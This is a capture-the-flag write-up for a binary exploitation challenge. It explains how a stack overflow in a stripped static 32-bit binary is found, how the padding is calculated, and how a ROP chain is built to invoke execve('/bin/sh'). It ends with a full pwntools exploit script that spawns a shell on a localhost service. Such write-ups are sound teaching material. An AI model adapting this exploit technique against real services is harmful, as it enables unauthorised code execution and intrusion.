## stack

**Category:** Exploit

**Points:** 350

**Solves:** 0

**Description:** We got intel that there is a secret message in the file 'flag.txt' located in the user's home dir

### Write-up

#### environment setup

we were given a binary named `exploit` and ip:port comnination which the binary listens to. since i dont remmber the exact port number, i will just use port 1234 on the localhost in this writeup. the binary was served using socat as follows

```
socat TCP-LISTEN:12345,reuseaddr,fork EXEC:"./exploit"
```
#### vulnerability identification

analyzing the binary in IDA/HexRays showed that `sub_8048B01()` vulnerable to stack buffer overflow, whereby the local variable `v1` that is populated in `sub_80489F4()` is using unsecure `scanf` function (wild guess based on the parameter passed)

![img](img/2018-10-10_04-52.png)
![img](img/2018-10-10_04-51.png)

further analysis on the binary reveals that the `NX` flag was enabled which renders shellcode (`ret2stack`) attack useless. furthermore, the fact that the binary is a stripped static binary makes `ret2libc` attack impossible since we cannot find on libc functions. Thus we can only rely on ropchain attack to execute `/bin/sh` through a system call.

![img](img/2018-10-10_05-12.png)

#### padding calculation

to execute a ropchain attack, we need to overwrite the `saved eip` with our rop gadgets. in order to do that, we need to figure out the exact number of bytes we need to pad from the buffer to the `saved eip`. from the first screenshot, we can see that variable `v1` is `38 (0x26)` bytes away from `ebp`. and since saved eip is located `4` bytes on top of `ebp`, we can deduce that we need to pad `42 (38+4)` bytes of the buffer to reach the `saved eip`. this can be confirmed by providing overflowing cyclic pattern to the buffer and calculating the offset of the value in `eip` at the `SIGSEGV` stop.

![img](img/2018-10-10_05-32.png)

#### linux x86 syscall

now before we move on to the rop chain generation, we need to understand how to make an `execve` system call. basically, we need to call the relevant interrupt (`int 80h`) to make a system call. the `eax` register will hold the system call number and `ebx`,`ecx`,`edx`,`esi`,`edi` and `ebp` will hold the parameters respectively. you can read about it in depth [HERE](https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html).

![img](img/2018-10-10_05-59.png)

the system call number for `execve` is `0xb (11)`. based on the above manual,  parameter 1 (`ebx`) will hold the address to the filename to be executed, parameter 2 (`ecx`) will hold the array to the arguments and parameter 3 (`edx`) will hold the array to the environement variables. in our case `ebx` will point to `/bin/sh` address while `ecx` and `edx` will point to null address since we dont need any arguments nor environment variables.

#### writing data

first we need to point `ebx` to `/bin/sh` string. the binary provided does not contain the string needed, thus we need to manually insert it into the binary memory. and since we does not know wether the server enables `aslr` or not, we will also avoid writing the string on the stack. we can find writable memory address using `vmmap` command in gdb

![img](img/2018-10-10_06-28.png)

i had chose to write the string in the heap section as it already populated with null characters which save me the trouble of null truncating the string.

#### ropchain generation

now that we have a writable address, we need to find/chain write-what-where gadget(s) in order to write data to it. finding the gadgets manually was a cumbersome process, so i had use `ropper` to semi-automate the chain generation. note that the data was read using `scanf` into the buffer, so we need to declare a few "bad bytes" (whitespace characters `0x9` - `0xd`) that will cause problem. the command are as follows

![img](img/2018-10-10_14-58.png)

now we need to find a way to control `edx` and `eax`. for `edx`, we can just find `pop edx` instruction to populate data into it. but for `eax` there are no reliable `pop eax` instruction in the binary, so i chose to use `lea eax, [edx]` instead

![img](img/2018-10-10_15-05.png)
![img](img/2018-10-10_15-07.png)

repeat the same process to find other gadgets and prepare other registers needed for a `execve` system call. full exploit code:

```python
from pwn import *

context.terminal = ['urxvtc', '-e', 'sh', '-c']

rop = 'a' * 42

lea_eax_edx = 0x08067e64    # lea eax, dword ptr [edx]; ret;
pop_ecx_ebx = 0x0806ff71    # pop ecx; pop ebx; ret
pop_edx = 0x0806ff4a        # pop edx; ret;
write_addr = 0x080ec000     # writable address
mov_edx_eax = 0x0805594b    # mov dword ptr [edx], eax; ret;
xor_eax = 0x08049693        # xor eax, eax; ret;
inc_eax = 0x0807b52f        # inc eax; ret;
int80 = 0x08070510          # int 0x80; ret;

# mov //bin to writable address
rop += p32(pop_edx)
rop += '//bi'
rop += p32(lea_eax_edx)
rop += p32(pop_edx)
rop += p32(write_addr)
rop += p32(mov_edx_eax)

# append n/sh
rop += p32(pop_edx)
rop += 'n/sh'
rop += p32(lea_eax_edx)
rop += p32(pop_edx)
rop += p32(write_addr + 4)
rop += p32(mov_edx_eax)

# point ecx to null & ebx to //bin/sh
rop += p32(pop_ecx_ebx)
rop += p32(write_addr + 8)
rop += p32(write_addr)

# point edx to null
rop += p32(pop_edx)
rop += p32(write_addr + 8)

# make eax = 11 (execve)
rop += p32(xor_eax)
rop += p32(inc_eax) * 11

# make system call
rop += p32(int80)

# create remote connection
r = remote('127.0.0.1', 12345)

# interact with binary
r.recvuntil("Exit\n: ")
r.sendline("1")
r.recvuntil("Name: ")
r.sendline(rop)
r.recvuntil("Exit\n: ")
r.sendline("3")

# shell time baby!
r.interactive()
```

![img](img/2018-10-10_15-24.png)